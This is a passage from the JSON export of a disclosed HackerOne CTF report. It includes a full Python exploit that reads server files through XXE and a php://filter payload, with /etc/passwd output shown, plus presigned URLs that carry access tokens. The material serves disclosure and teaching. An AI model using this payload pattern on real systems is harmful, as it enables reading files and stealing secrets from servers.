Jj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=b241f80eb3f5e93efac5979fd5a267a06e41bd0f529978b3f4d18a024365d4e1","file_size":129260,"type":"image/png"},{"id":352838,"file_name":"1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?response-content-disposition=attachment%3B%20filename%3D%221538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg%22%3B%20filename%2A%3DUTF-8%27%271538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055441Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=c0869d10a8625ddbcae483d715b81bac3bf00876d359609b661bfae7b2ba3b01","file_size":32612,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2018-11-21T17:55:15.916Z","allow_singular_disclosure_after":-66398365.90897836,"singular_disclosure_allowed":true,"vote_count":14,"voters":["foobar7","spam404","0xacb","sameerphad72","mygf","aryan2808","eveeez","japz","bb00x","spetr0x","and 4 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3409911,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Because we're different kind of animals and in case this ever gets disclosed, there should be something for others to learn from this. Let's make it this time a lesson about automation. Initial proof-of-concept should be manually doable, but if you're going to make more than 10 requests yourself, the process should be automated to some extent.\n\n### Automation\nHere's a quick python script to exploit the XXE to read files from the server:\n\n```\n# Hackerone 5411 MemeCTF XXE to read server files exploit\nimport requests\nimport time\nimport sys\nimport base64\n\n# Init\nif sys.argv[1] == \"-h\" or sys.argv[1] == \"--help\":\n    print \"### XAT by Opsec ###\"\n    print \"Read local files on Hackerone 5411 CTF box using XXE vulnerability\"\n    print \"Usage: python xat.py [path-to-file, string]\"\n    print \"-h, --help    Print this info\"\n    sys.exit()\nelse:\n    file_to_cat = sys.argv[1]\n    print \"Looking for %s\" % file_to_cat\n\n# Endpoints\nbase_url = 'https://h1-5411.h1ctf.com/'\nmemes_url = 'memes.php'\nimport_url = 'api/import_memes_2.0.php'\n\n# Get session cookie\nprint \"Getting session cookie\"\nr = requests.head(base_url + memes_url)\ncookie = r.headers['Set-Cookie'].split(';')[0]\n# Import payload\nprint \"Generating payload\"\npayload = '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY \u003e\u003c!ENTITY xxe SYSTEM \\'php://filter/convert.base64-encode/resource=file:///%s\\'\u003e]\u003e\u003cmeme\u003e\u003ctoptext\u003eq\u003c/toptext\u003e\u003cbottomtext\u003ea\u003c/bottomtext\u003e\u003ctemplate\u003e\u0026xxe;\u003c/template\u003e\u003ctype\u003eTEXT\u003c/type\u003e\u003c/meme\u003e' % file_to_cat\nphp_object = 'a:2:{i:0;s:15:\"../css/grid.css\";i:1;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:%s:\"%s\";}}' % (len(payload), payload)\nmemepak = {'f': ('memes.memepak', base64.b64encode(php_object), 'application/octet-stream')}\n\n# Make XXE-request\nset_headers = {\n    'Cookie': cookie\n    }\nprint \"Sending payload\"\nr = requests.post(base_url + import_url,\n                headers = set_headers,\n                files = memepak)\n# Make sure that the server is ready with imported data, 3 sec should be enough\nprint \"Sleep 3\"\ntime.sleep(3)\n\n# Request XXE-content\nprint \"Requesting exploit data\"\nr = requests.get(base_url + memes_url,\n                headers = set_headers)\n\n# Check response for exploit data\nexploit_data = \"\"\nfor line in r.text.splitlines():\n    if 'Template Location =\u0026gt; ' in line:\n        exploit_data = line.split('Template Location =\u0026gt; ')[1]\n        break\n\nif len(exploit_data) \u003e 0:\n    exploit_product = base64.b64decode(exploit_data)\n    print \"Exploit product:\\r\\n\"\n    print exploit_product\nelse:\n    print \"No exploit product! File doesn't exist, is empty or user www-data has no permission for it.\"\n```\n\nWhich in use produces output like this:\n\n```\n\u003epython xat.py /etc/passwd\nLooking for /etc/passwd\nGetting session cookie\nGenerating payload\nSending payload\nSleep 3\nRequesting exploit data\nExploit product:\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu22458:x:22458:22458:,,,:/app:/bin/bash\ndyno:x:22458:22458:,,,:/app:/bin/bash\n```\n\nA quick script for automating the file discovery speeds up the research process a lot. Also writing exploits is a good way to actually understand what you're dealing with and how it should be treated. And if you're lacking something to do, you can always make them better, for e.g. make them save the output etc.\n\n### PHP Filters\n\nAnother point I want to bring to attention is the usage of PHP filters to exfil the data from the server. In many cases the XXE exfil fails due to encoding or character related problems. During the CTF I noticed many of the participants saying they were able to perform XXE, but thought it was \"blind\" because they were unable to exfil the data.\n\nWith usage of PHP filter, you don't have to think about the encodings or characters involved in the file, as they get encoded to base64 which on the other hand can be regarded as HTTP safe.\n```\nphp://filter/convert.base64-encode/resource=file:///%s\n``` \nCheck the payload in the initial report or in the script!","markdown_message":"\u003cp\u003eBecause we\u0026#39;re different kind of animals and in case this ever gets disclosed, there should be something for others to learn from this. Let\u0026#39;s make it this time a lesson about automation. Initial proof-of-concept should be manually doable, but if you\u0026#39;re going to make more than 10 requests yourself, the process should be automated to some extent.\u003c/p\u003e\n\n\u003ch3 id=\"automation\"\u003eAutomation\u003c/h3\u003e\n\n\u003cp\u003eHere\u0026#39;s a quick python script to exploit the XXE to read files from the server:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Hackerone 5411 MemeCTF XXE to read server files exploit\nimport requests\nimport time\nimport sys\nimport base64\n\n# Init\nif sys.argv[1] == \u0026quot;-h\u0026quot; or sys.argv[1] == \u0026quot;--help\u0026quot;:\n    print \u0026quot;### XAT by Opsec ###\u0026quot;\n    print \u0026quot;Read local files on Hackerone 5411 CTF box using XXE vulnerability\u0026quot;\n    print \u0026quot;Usage: python xat.py [path-to-file, string]\u0026quot;\n    print \u0026quot;-h, --help    Print this info\u0026quot;\n    sys.exit()\nelse:\n    file_to_cat = sys.argv[1]\n    print \u0026quot;Looking for %s\u0026quot; % file_to_cat\n\n# Endpoints\nbase_url = \u0026#39;https://h1-5411.h1ctf.com/\u0026#39;\nmemes_url = \u0026#39;memes.php\u0026#39;\nimport_url = \u0026#39;api/import_memes_2.0.php\u0026#39;\n\n# Get session cookie\nprint \u0026quot;Getting session cookie\u0026quot;\nr = requests.head(base_url + memes_url)\ncookie = r.headers[\u0026#39;Set-Cookie\u0026#39;].split(\u0026#39;;\u0026#39;)[0]\n# Import payload\nprint \u0026quot;Generating payload\u0026quot;\npayload = \u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ELEMENT foo ANY \u0026gt;\u0026lt;!ENTITY xxe SYSTEM \\\u0026#39;php://filter/convert.base64-encode/resource=file:///%s\\\u0026#39;\u0026gt;]\u0026gt;\u0026lt;meme\u0026gt;\u0026lt;toptext\u0026gt;q\u0026lt;/toptext\u0026gt;\u0026lt;bottomtext\u0026gt;a\u0026lt;/bottomtext\u0026gt;\u0026lt;template\u0026gt;\u0026amp;xxe;\u0026lt;/template\u0026gt;\u0026lt;type\u0026gt;TEXT\u0026lt;/type\u0026gt;\u0026lt;/meme\u0026gt;\u0026#39; % file_to_cat\nphp_object = \u0026#39;a:2:{i:0;s:15:\u0026quot;../css/grid.css\u0026quot;;i:1;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:%s:\u0026quot;%s\u0026quot;;}}\u0026#39; % (len(payload), payload)\nmemepak = {\u0026#39;f\u0026#39;: (\u0026#39;memes.memepak\u0026#39;, base64.b64encode(php_object), \u0026#39;application/octet-stream\u0026#39;)}\n\n# Make XXE-request\nset_headers = {\n    \u0026#39;Cookie\u0026#39;: cookie\n    }\nprint \u0026quot;Sending payload\u0026quot;\nr = requests.post(base_url + import_url,\n                headers = set_headers,\n                files = memepak)\n# Make sure that the server is ready with imported data, 3 sec should be enough\nprint \u0026quot;Sleep 3\u0026quot;\ntime.sleep(3)\n\n# Request XXE-content\nprint \u0026quot;Requesting exploit data\u0026quot;\nr = requests.get(base_url + memes_url,\n                headers = set_headers)\n\n# Check response for exploit data\nexploit_data = \u0026quot;\u0026quot;\nfor line in r.text.splitlines():\n    if \u0026#39;Template Location =\u0026amp;gt; \u0026#39; in line:\n        exploit_data = line.split(\u0026#39;Template Location =\u0026amp;gt; \u0026#39;)[1]\n        break\n\nif len(exploit_data) \u0026gt; 0:\n    exploit_product = base64.b64decode(exploit_data)\n    print \u0026quot;Exploit product:\\r\\n\u0026quot;\n    print exploit_product\nelse:\n    print \u0026quot;No exploit product! File doesn\u0026#39;t exist, is empty or user www-data has no permission for it.\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich in use produces output like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026gt;python xat.py /etc/passwd\nLooking for /etc/passwd\nGetting session cookie\nGenerating payload\nSending payload\nSleep 3\nRequesting exploit data\nExploit product:\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu22458:x:22458:22458:,,,:/app:/bin/bash\ndyno:x:22458:22458:,,,:/app:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA quick script for automating the file discovery speeds up the research process a lot. Also writing exploits is a good way to actually understand what you\u0026#39;re dealing with and how it should be treated. And if you\u0026#39;re lacking something to do, you can always make them better, for e.g. make them save the output etc.\u003c/p\u003e\n\n\u003ch3 id=\"php-filters\"\u003ePHP Filters\u003c/h3\u003e\n\n\u003cp\u003eAnother point I want to bring to attention is the usage of PHP filters to exfil the data from the server. In many cases the XXE exfil fails due to encoding or character related problems. During the CTF I noticed many of the participants saying they were able to perform XXE, but thought it was \u0026quot;blind\u0026quot; because they were unable to exfil the data.\u003c/p\u003e\n\n\u003cp\u003eWith usage of PHP filter, you don\u0026#39;t have to think about the encodings or characters involved in the file, as they get encoded to base64 which on the other hand can be regarded as HTTP safe.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ephp://filter/convert.base64-encode/resource=file:///%s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheck the payload in the initial report or in the script!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-30T13:15:22.220Z","updated_at":"2018-09-30T13:23:11.243Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3411788,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @osintopsec!\n\nThank you so much for this report and the script.\nWe added the papertrail logs after a while and we didn't think about this!\n\nBy the time you submitted this report we already had the winners selected for the H1-5411 event. I'm going to discuss this report with the staff. I'm not sure if the CTF reports are going to be disclosed.\n\nWe'll reach out to you soon!","markdown_message":"\u003cp\u003eHello \u003ca href=\"/osintopsec\"\u003e@osintopsec\u003c/a\u003e!\u003c/p\u003e\n\n\u003cp\u003eThank you so much for this report and the script.\u003cbr\u003e\nWe added the papertrail logs after a while and we didn\u0026#39;t think about this!\u003c/p\u003e\n\n\u003cp\u003eBy the time you submitted this report we already had the winners selected for the H1-5411 event. I\u0026#39;m going to discuss this report with the staff. I\u0026#39;m not sure if the CTF reports are going to be disclosed.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll reach out to you soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-01T08:58:20.134Z","updated_at":"2018-10-01T08:58:20.134Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3412144,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xacb, \n\nThanks for getting back to me! Was fun to find an actual vulnerability even that i got to start the ctf a bit late. Keep me posted and keep up the good fight! ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThanks for getting back to me! Was fun to find an actual vulnerability even that i got to start the ctf a bit late. Keep me posted and keep up the good fight! \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-01T09:23:09.687Z","updated_at":"2018-10-01T09:23:09.687Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3422287,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hola @0xacb!\n\nCan confirm, the papertrail key has been rotated.\n\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Z-RETACTED\" https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 401 Unauthorized\nDate: Tue, 02 Oct 2018 18:26:24 GMT\nStrict-Transport-Security: max-age=31536000\nCache-Control: no-cache\nWWW-Authenticate: Basic realm=\"Papertrail API\"\nX-Runtime: 3\nContent-Length: 27\nStatus: 401 Unauthorized\nVary: Accept-Encoding\nContent-Type: text/html; charset=utf-8\n\nHTTP Basic: Access denied.\n```","markdown_message":"\u003cp\u003eHola \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e!\u003c/p\u003e\n\n\u003cp\u003eCan confirm, the papertrail key has been rotated.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -H \u0026quot;X-Papertrail-Token: ii6r9Z-RETACTED\u0026quot; https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 401 Unauthorized\nDate: Tue, 02 Oct 2018 18:26:24 GMT\nStrict-Transport-Security: max-age=31536000\nCache-Control: no-cache\nWWW-Authenticate: Basic realm=\u0026quot;Papertrail API\u0026quot;\nX-Runtime: 3\nContent-Length: 27\nStatus: 401 Unauthorized\nVary: Accept-Encoding\nContent-Type: text/html; charset=utf-8\n\nHTTP Basic: Access denied.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-10-02T18:28:21.718Z","updated_at":"2018-10-02T18:28:21.718Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3514735,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-22T15:59:44.372Z","updated_at":"2018-10-22T15:59:44.372Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"osintopsec","url":"/osintopsec"},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3515355,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Did I lose my chance of getting a H1 hoodie?","markdown_message":"\u003cp\u003eDid I lose my chance of getting a H1 hoodie?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-22T17:55:02.791Z","updated_at":"2018-10-22T17:55:02.791Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3515357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Anyway! I feel like there's something in this report that's beneficial to the community (ie. never stop looking!), can we disclose this also like the others?","markdown_message":"\u003cp\u003eAnyway! I feel like there\u0026#39;s something in this report that\u0026#39;s beneficial to the community (ie. never stop looking!), can we disclose this also like the others?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-22T17:55:15.870Z","updated_at":"2018-10-22T17:55:15.870Z","first_to_agree":true,"actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3516282,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hey @osintopsec - Thank you for your submission and we'd be more than happy to disclose this, but in the future please note that hacking the CTF instance or leaderboards are out of scope of the CTF. We are going to make sure to highlight this in our \"Rules of engagement\" moving forward. \n\nWe appreciate you reporting this to us and we'd love to send you some h1 swag since we weren't able to invite you to the live hacking event. Thanks again and happy hacking! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/osintopsec\"\u003e@osintopsec\u003c/a\u003e - Thank you for your submission and we\u0026#39;d be more than happy to disclose this, but in the future please note that hacking the CTF instance or leaderboards are out of scope of the CTF. We are going to make sure to highlight this in our \u0026quot;Rules of engagement\u0026quot; moving forward. \u003c/p\u003e\n\n\u003cp\u003eWe appreciate you reporting this to us and we\u0026#39;d love to send you some h1 swag since we weren\u0026#39;t able to invite you to the live hacking event. Thanks again and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-22T20:38:44.655Z","updated_at":"2018-10-22T20:38:44.655Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3516283,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-22T20:38:44.745Z","updated_at":"2018-10-22T20:38:44.745Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3517774,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec! That's a sure thing, but maybe there can be some safe harbor if a event like this ever happens again - like in this case which was more of an accident giving out those red flags that put the brain on the thread mill. The swag is welcomed with great appreciation.\n\n@0xacb and @nahamsec, there is still one question which I would be very interested to have an answer:\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n``` \nDid you guys put up the header and did you have any suspicion that someone would actually find it? ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e! That\u0026#39;s a sure thing, but maybe there can be some safe harbor if a event like this ever happens again - like in this case which was more of an accident giving out those red flags that put the brain on the thread mill. The swag is welcomed with great appreciation.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e and \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, there is still one question which I would be very interested to have an answer:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-Shibboleet: if you see this, we\u0026#39;d like to get you a thank you espresso\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDid you guys put up the header and did you have any suspicion that someone would actually find it? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T06:18:56.642Z","updated_at":"2018-10-23T06:26:52.953Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3521360,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @osintopsec,\n\nNo, this seems a random header added by papertrailapp.com :)\n\nBest regards,\nAndr","markdown_message":"\u003cp\u003eHey \u003ca href=\"/osintopsec\"\u003e@osintopsec\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNo, this seems a random header added by papertrailapp.com :)\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nAndr\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T17:19:57.356Z","updated_at":"2018-10-23T17:19:57.356Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3586762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xacb\n\nThis might be the final epilogue to this story. Solarwinds (the company behind Papertrail) was indeed interested in hearing about the header and where I found it, and I also found out that the guys there are extremely hacker-friendly. Mail got me coffee today as promised on the header!\n{F370888}\n\nSo thank you @0xacb and @nahamsec for the great experience! I'm looking forward to the next challenge.\n\nAlso ping @nahamsec for h1-swag :)\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis might be the final epilogue to this story. Solarwinds (the company behind Papertrail) was indeed interested in hearing about the header and where I found it, and I also found out that the guys there are extremely hacker-friendly. Mail got me coffee today as promised on the header!\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"coffee.jpg\" 